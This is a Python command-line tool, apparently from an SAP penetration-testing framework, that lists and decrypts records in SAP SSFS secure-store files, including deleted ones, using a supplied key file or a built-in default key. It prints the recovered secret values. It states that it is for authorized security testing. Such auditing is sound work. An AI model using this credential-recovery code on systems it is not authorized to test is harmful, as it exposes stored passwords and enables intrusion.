#!/usr/bin/env python3
"""
sap_ssfs_decrypt.py — command-line reader for SAP SSFS_<SID>.DAT secure stores.

Thin CLI wrapper built around ``parse_ssfs_dat`` (modules/data_extraction/
sapmap_secstore.py).  Because ``parse_ssfs_dat`` intentionally drops deleted
records and performs no global numbering, this tool re-walks the same record
structure (same preamble / offsets / flags) so it can expose *every* record —
active and deleted — with a stable index, while reusing the project's
``DEFAULT_KEY_HEX``, SSFS key extraction and ``rsec_decrypt`` for the actual
crypto.  Single source of truth stays in sapmap_secstore.

Record layout (see parse_ssfs_dat docstring):
    preamble "RSecSSFsData"          offset   0, 12 bytes
    total record length (BE uint32)  offset  12,  4 bytes
    IDENT (space/NUL padded)         offset  24, 64 bytes
    is_deleted flag                  offset 144,  1 byte
    is_stored_as_plaintext flag      offset 145,  1 byte
    data payload                     offset 176, (total_length - 176) bytes

Modes:
    -l / --list            list the active keys (with their global index);
                           add -a / --all to include deleted entries too
    -i / --id   IDENT      show the *active* entry for the given IDENT
    -n / --number N        show entry number N from the list (active OR deleted)

Key handling:
    --key FILE   an SSFS_<SID>.KEY file (plaintext or encrypted format).
                 If omitted, DEFAULT_KEY_HEX is used.

Value display (modes --id / --number):
    plaintext records  -> shown as a normal string
    encrypted records  -> decrypted, then shown as a hexdump (default)
    --hex forces a hexdump even for plaintext records.

For authorized security testing only — see DISCLAIMER.md.

Assisted by Claude Opus 4.8
"""

import argparse
import os
import sys

# --- bootstrap the SAPMAP flat-import path -------------------------------
_THIS = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(os.path.dirname(_THIS))   # repo root (…/SAPMAP)
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)
import modules  # noqa: F401  (registers every modules/* subdir on sys.path)

from sapmap_secstore import DEFAULT_KEY_HEX, extract_ssfs_key  # noqa: E402

# Record layout constants — kept identical to parse_ssfs_dat.
_REC_PREAMBLE   = b"RSecSSFsData"
_REC_HEADER_LEN = 176
_OFF_RECLEN     = 12
_OFF_IDENT      = 24
_OFF_IDENT_END  = 88
_OFF_DELETED    = 144
_OFF_PLAINTEXT  = 145
_MAX_REC_LEN    = 0x18150


class Record:
    """One SSFS record, carrying its global index and raw payload."""

    __slots__ = ("index", "ident", "is_deleted", "is_plaintext", "raw")

    def __init__(self, index, ident, is_deleted, is_plaintext, raw):
        self.index = index
        self.ident = ident
        self.is_deleted = is_deleted
        self.is_plaintext = is_plaintext
        self.raw = raw


def enumerate_records(dat_bytes):
    """Walk every record in the DAT blob, active and deleted alike.

    Mirrors the scan loop of ``parse_ssfs_dat`` but keeps deleted records and
    assigns each surviving record a sequential global index (0-based).  That
    index is what ``--number`` selects and what ``--list`` prints, so the list
    numbering is deliberately non-contiguous once deleted records are hidden.
    """
    records = []
    if len(dat_bytes) < 24:
        return records

    pos = 0
    index = 0
    n = len(dat_bytes)
    while pos + _REC_HEADER_LEN <= n:
        idx = dat_bytes.find(_REC_PREAMBLE, pos)
        if idx < 0:
            break
        pos = idx
        if pos + _REC_HEADER_LEN > n:
            break

        rec_len = int.from_bytes(dat_bytes[pos + _OFF_RECLEN:pos + _OFF_RECLEN + 4], "big")
        if rec_len < _REC_HEADER_LEN or rec_len > _MAX_REC_LEN:
            pos += _OFF_RECLEN  # false preamble hit; step past it
            continue
        if pos + rec_len > n:
            break

        ident_raw = dat_bytes[pos + _OFF_IDENT:pos + _OFF_IDENT_END]
        ident = ident_raw.rstrip(b" \x00").decode("ascii", errors="replace").strip()

        is_deleted   = bool(dat_bytes[pos + _OFF_DELETED])
        is_plaintext = bool(dat_bytes[pos + _OFF_PLAINTEXT])

        data = dat_bytes[pos + _REC_HEADER_LEN:pos + rec_len]

        records.append(Record(index, ident, is_deleted, is_plaintext, data))
        index += 1
        pos += rec_len

    return records


def load_key(key_path):
    """Return the 24-byte SSFS key from an SSFS_<SID>.KEY file, or the default."""
    if key_path:
        with open(key_path, "rb") as fh:
            key = extract_ssfs_key(fh.read())
        print(f"[*] Using key from {key_path} ({len(key)} bytes)")
        return key
    key = bytes.fromhex(DEFAULT_KEY_HEX)
    print(f"[*] Using built-in DEFAULT_KEY_HEX ({len(key)} bytes)")
    return key


def decrypt_payload(rec, key):
    """Return the plaintext value bytes for a record.

    Plaintext records are returned verbatim; encrypted records are run through
    ``rsec_decrypt`` with the same length guard parse_ssfs_dat applies.  On any
    decryption failure the still-encrypted bytes are returned so the caller can
    at least see a hexdump.
    """
    if rec.is_plaintext:
        return rec.raw, False  # (bytes, encrypted?)
    if len(rec.raw) >= 8 and len(rec.raw) % 8 == 0:
        try:
            from sap_rsec_cipher import rsec_decrypt
            return rsec_decrypt(rec.raw, key), False
        except Exception as exc:  # noqa: BLE001
            print(f"[-] Decryption failed ({exc}); showing raw ciphertext")
            return rec.raw, True
    print(f"[-] Payload length {len(rec.raw)} not a usable 3DES block; "
          f"showing raw ciphertext")
    return rec.raw, True


# ---------------------------------------------------------------------------
# Public API (for use by other modules)
# ---------------------------------------------------------------------------

def get_ssfs_record(dat, name, key=None):
    """Look up a single SSFS record by IDENT and return it as a dict.

    This is the programmatic entry point for other modules — it prints
    nothing and reuses the same parsing/decryption as the CLI.

    :param dat:  raw bytes of an ``SSFS_<SID>.DAT`` file
    :param name: the record IDENT to look up (the *active* record wins when a
                 deleted record shares the same IDENT)
    :param key:  optional 24-byte SSFS key; defaults to ``DEFAULT_KEY_HEX``

    :returns: ``None`` if no active record with that IDENT exists, otherwise a
        dict:

          * plaintext record::

                {"ident": name, "value": <str>, "encrypted": False,
                 "decrypted": True}

          * encrypted record (``value`` is the decrypted byte-array)::

                {"ident": name, "value": <bytes>, "encrypted": True,
                 "decrypted": True}

        When an encrypted payload cannot be decrypted (unusable block length or
        a crypto error) the still-encrypted bytes are returned with
        ``"decrypted": False`` so the caller can decide what to do.
    """
    wanted = name.strip() if isinstance(name, str) else name
    matches = [r for r in enumerate_records(dat)
               if r.ident == wanted and not r.is_deleted]
    if not matches:
        return None
    rec = matches[0]

    if rec.is_plaintext:
        return {"ident": rec.ident, "value": as_string(rec.raw),
                "encrypted": False, "decrypted": True}

    k = key if key is not None else bytes.fromhex(DEFAULT_KEY_HEX)
    if len(rec.raw) >= 8 and len(rec.raw) % 8 == 0:
        try:
            from sap_rsec_cipher import rsec_decrypt
            return {"ident": rec.ident, "value": rsec_decrypt(rec.raw, k),
                    "encrypted": True, "decrypted": True}
        except Exception:  # noqa: BLE001
            pass
    return {"ident": rec.ident, "value": rec.raw,
            "encrypted": True, "decrypted": False}


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def hexdump(data, width=16):
    """Classic offset / hex / ASCII hexdump of a bytes object."""
    lines = []
    for off in range(0, len(data), width):
        chunk = data[off:off + width]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        # pad hex column and add a mid gap for readability
        hex_part = f"{hex_part:<{width * 3 - 1}}"
        hex_part = hex_part[:width // 2 * 3] + " " + hex_part[width // 2 * 3:]
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{off:08x}  {hex_part}  |{ascii_part}|")
    if not lines:
        lines.append("00000000  (empty)")
    return "\n".join(lines)


def as_string(data):
    """Best-effort human string: strip trailing NUL/space padding."""
    return data.rstrip(b"\x00 ").decode("utf-8", errors="replace")


# Offsets of the inner value frame inside a decrypted encrypted payload:
#   bytes  8-11 : int32 big-endian length of the value
#   bytes 32..  : the value itself (`length` bytes)
_VAL_LEN_OFF   = 8
_VAL_DATA_OFF  = 32


def extract_printable(value):
    """Decode the inner string of a decrypted encrypted SSFS payload.

    Layout: an int32 length lives at bytes 8-11 (big-endian); the value
    follows at byte 32.  Returns ``(text, None)`` on success or
    ``(None, reason)`` when the length field is implausible — a wrong key or
    mis-framed blob yields garbage here, so the bounds are validated before
    any slicing.
    """
    if len(value) < _VAL_DATA_OFF:
        return None, (f"payload only {len(value)} bytes, need at least "
                      f"{_VAL_DATA_OFF} for the value frame")

    length = int.from_bytes(value[_VAL_LEN_OFF:_VAL_LEN_OFF + 4], "big")
    avail = len(value) - _VAL_DATA_OFF
    if length <= 0:
        return None, f"declared length {length} is not positive"
    if length > avail:
        return None, (f"declared length {length} exceeds the {avail} bytes "
                      f"available after offset {_VAL_DATA_OFF}")

    raw = value[_VAL_DATA_OFF:_VAL_DATA_OFF + length]
    # Prefer strict 7-bit ASCII; fall back to UTF-8 for non-ASCII content.
    try:
        return raw.decode("ascii"), None
    except UnicodeDecodeError:
        try:
            return raw.decode("utf-8"), None
        except UnicodeDecodeError as exc:
            return None, f"value is neither valid ASCII nor UTF-8 ({exc})"


def print_entry(rec, key, force_hex=False, printable=False):
    """Print one record's metadata and value (modes --id / --number)."""
    state = "DELETED" if rec.is_deleted else "active"
    kind  = "plaintext" if rec.is_plaintext else "encrypted"
    value, still_encrypted = decrypt_payload(rec, key)

    print(f"Index   : {rec.index}")
    print(f"IDENT   : {rec.ident}")
    print(f"State   : {state}")
    print(f"Storage : {kind}")
    print(f"Length  : {len(value)} bytes")
    print("Value   :")
    if rec.is_plaintext and not force_hex and not still_encrypted:
        print(f"  {as_string(value)}")
        return

    # --printable: decode the inner value frame of a decrypted encrypted entry.
    if printable and not rec.is_plaintext and not still_encrypted and not force_hex:
        text, err = extract_printable(value)
        if text is not None:
            print(f"  {text}")
            return
        print(f"  [--printable: {err}; showing hexdump]")

    if still_encrypted:
        print("  [could not decrypt — showing ciphertext]")
    print("\n".join("  " + ln for ln in hexdump(value).splitlines()))


def print_list(records, show_deleted=False):
    """Print the keys with their (non-contiguous) global index.

    By default only active keys are listed; ``show_deleted`` adds the deleted
    records too (with a State column) so the full, contiguous index is visible.
    """
    active = [r for r in records if not r.is_deleted]
    shown = records if show_deleted else active
    print(f"[*] {len(active)} active key(s) "
          f"({len(records)} total records, "
          f"{len(records) - len(active)} deleted)\n")
    print(f"  {'No.':>5}  {'State':<7}  {'Storage':<9}  IDENT")
    print(f"  {'-' * 5}  {'-' * 7}  {'-' * 9}  {'-' * 40}")
    for r in shown:
        state = "DELETED" if r.is_deleted else "active"
        kind = "plaintext" if r.is_plaintext else "encrypted"
        print(f"  {r.index:>5}  {state:<7}  {kind:<9}  {r.ident}")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def build_parser():
    p = argparse.ArgumentParser(
        prog="sap_ssfs_decrypt.py",
        description="Read/decrypt SAP SSFS_<SID>.DAT secure stores.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("dat_file", help="path to the SSFS_<SID>.DAT data file")
    p.add_argument("-k", "--key", metavar="FILE",
                   help="SSFS_<SID>.KEY file; if omitted, DEFAULT_KEY_HEX is used")

    mode = p.add_mutually_exclusive_group(required=True)
    mode.add_argument("-l", "--list", action="store_true",
                      help="list the active keys (with global index)")
    mode.add_argument("-i", "--id", metavar="IDENT",
                      help="show the active entry with this IDENT")
    mode.add_argument("-n", "--number", type=int, metavar="N",
                      help="show entry number N from the list (active or deleted)")

    p.add_argument("-a", "--all", action="store_true",
                   help="with --list, also show deleted entries")
    p.add_argument("--hex", action="store_true",
                   help="force a hexdump even for plaintext entries")
    p.add_argument("-p", "--printable", action="store_true",
                   help="for encrypted entries, decode the inner value frame "
                        "(int32 length at bytes 8-11, value at byte 32) as "
                        "ASCII/UTF-8 instead of a hexdump")
    return p


def main(argv=None):
    args = build_parser().parse_args(argv)

    try:
        with open(args.dat_file, "rb") as fh:
            dat_bytes = fh.read()
    except OSError as exc:
        print(f"[-] Cannot read DAT file: {exc}")
        return 2

    records = enumerate_records(dat_bytes)
    if not records:
        print("[-] No SSFS records found in file")
        return 1

    # --list needs no key; the other modes do.
    if args.list:
        print_list(records, show_deleted=args.all)
        return 0

    try:
        key = load_key(args.key)
    except (OSError, ValueError, RuntimeError) as exc:
        print(f"[-] Key error: {exc}")
        return 2

    if args.id is not None:
        wanted = args.id.strip()
        matches = [r for r in records if r.ident == wanted and not r.is_deleted]
        if not matches:
            deleted = [r for r in records if r.ident == wanted and r.is_deleted]
            if deleted:
                print(f"[-] No active entry for '{wanted}' "
                      f"({len(deleted)} deleted record(s) exist; "
                      f"use --number to inspect them)")
            else:
                print(f"[-] No entry with IDENT '{wanted}'")
            return 1
        if len(matches) > 1:
            print(f"[*] {len(matches)} active records share this IDENT; "
                  f"showing the first\n")
        print_entry(matches[0], key, force_hex=args.hex, printable=args.printable)
        return 0

    # args.number
    by_index = {r.index: r for r in records}
    rec = by_index.get(args.number)
    if rec is None:
        print(f"[-] No record with number {args.number} "
              f"(valid range 0..{len(records) - 1})")
        return 1
    print_entry(rec, key, force_hex=args.hex, printable=args.printable)
    return 0


if __name__ == "__main__":
    sys.exit(main())
